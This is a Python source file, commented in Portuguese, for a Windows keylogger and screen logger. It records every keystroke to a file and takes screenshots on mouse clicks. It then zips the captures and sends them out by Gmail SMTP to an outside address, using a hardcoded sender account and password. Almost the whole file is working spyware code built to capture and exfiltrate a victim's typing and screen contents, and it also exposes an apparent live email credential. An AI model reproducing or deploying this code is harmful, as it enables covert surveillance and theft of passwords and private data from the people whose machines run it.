from pynput import keyboard, mouse
from threading import Timer
import smtplib
from email.message import EmailMessage
import ctypes
import os
import win32gui
import win32ui
import win32con
import win32api
from zipfile import ZipFile
from PIL import Image


def get_capslock_state():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)


def update_txt_file(key):
    key_string = str(key).replace("'", "")
    do_nothing = 1

    with open(log_path, 'a') as file:
        # Armazena o estado do capslock
        caps_lock_state = get_capslock_state()

        # Atualiza a variável do estado do capslock
        if key_string == 'Key.caps_lock':
            if caps_lock_state == 0:
                caps_lock_state == 1
            elif caps_lock_state == 1:
                caps_lock_state == 0
        # Troca Key.space por ' '
        elif (key_string == 'Key.space'):
            file.write(' ')
        # Apaga um caractere
        elif key_string == 'Key.backspace':
            with open(log_path, 'rb+') as file:
                file_size = os.path.getsize(log_path)
                if file_size > 0:
                    file.seek(-1, os.SEEK_END)
                    file.truncate()
        # Impede a adição da keyword da tecla Shift
        elif key_string.find('Key.shift') != -1:
            do_nothing = 1
        # Representa de forma mais clara o restante das teclas que começam com Key
        elif key_string.find('Key') != -1:
            file.write('(' + key_string + ')')
        # Se for uma letra ou número, adiciona o caractere normalmente
        else:
            if caps_lock_state == 0:
                file.write(key_string)
            elif caps_lock_state == 1:
                file.write(key_string.upper())


def on_press(key):
    update_txt_file(key)


def send_email(email, password, receiver, subject='(no subject)'):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['To'] = receiver

    with open('log.zip', "rb") as myfile:
        file_data = myfile.read()
        file_name = myfile.name
        msg.add_attachment(file_data,
                           maintype="application",
                           subtype='zip',
                           filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(email, password)
        server.send_message(msg)


def on_click(x, y, button, pressed):
    global number_of_clicks

    if pressed and number_of_clicks < 5:
        number_of_clicks += 1
        print('click')
        # copy the screen into our memory device context
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),
                      win32con.SRCCOPY)
        # # save the bitmap to a file
        screenshot.SaveBitmapFile(
            mem_dc, 'screenshot' + f'{number_of_clicks}' + '.jpg')


# grab a handle to the main desktop window
hdesktop = win32gui.GetDesktopWindow()

# determine the size of all monitors in pixels
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

# create a device context
desktop_dc = win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)

# create a memory based device context
mem_dc = img_dc.CreateCompatibleDC()

# create a bitmap object
screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc, width, height)
mem_dc.SelectObject(screenshot)

x = False  # Value to if held
log_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
number_of_clicks = 0
execution_time = 10

print("[+] Keylogger funcionando com sucesso!")
print(f"[!] Salvando dados no diretório '{log_path}'")

with keyboard.Listener(on_press=on_press) as k_listener:
    with mouse.Listener(on_click=on_click) as m_listener:
        Timer(execution_time, m_listener.stop).start()
        Timer(execution_time, k_listener.stop).start()
        m_listener.join()
        k_listener.join()

# free our objects
mem_dc.DeleteDC()
win32gui.DeleteObject(screenshot.GetHandle())

print("[-] Keylogger e Screenlogger finalizados!")

image_file1 = Image.open('screenshot1.jpg')
image_file1.save("screenshot1.jpg", quality=65)

image_file2 = Image.open('screenshot2.jpg')
image_file2.save("screenshot2.jpg", quality=65)

image_file3 = Image.open('screenshot3.jpg')
image_file3.save("screenshot3.jpg", quality=65)

image_file4 = Image.open('screenshot4.jpg')
image_file4.save("screenshot4.jpg", quality=65)

image_file5 = Image.open('screenshot5.jpg')
image_file5.save("screenshot5.jpg", quality=65)

# create a ZipFile object
zipObj = ZipFile('log.zip', 'w')
# Add multiple files to the zip
zipObj.write('logs.txt')
zipObj.write('screenshot1.jpg')
zipObj.write('screenshot2.jpg')
zipObj.write('screenshot3.jpg')
zipObj.write('screenshot4.jpg')
zipObj.write('screenshot5.jpg')
# close the Zip File
zipObj.close()

try:
    send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
               'd.lima@aln.senaicimatec.edu.br', 'keylogger')
except:
    print("Couldn't send email")
else:
    print("Email sent!")


# To Do List:
# - usar for loops para reduzir o código
# - trocar path de todos os arquivos
# - talvez usar mais funcões para estruturar o código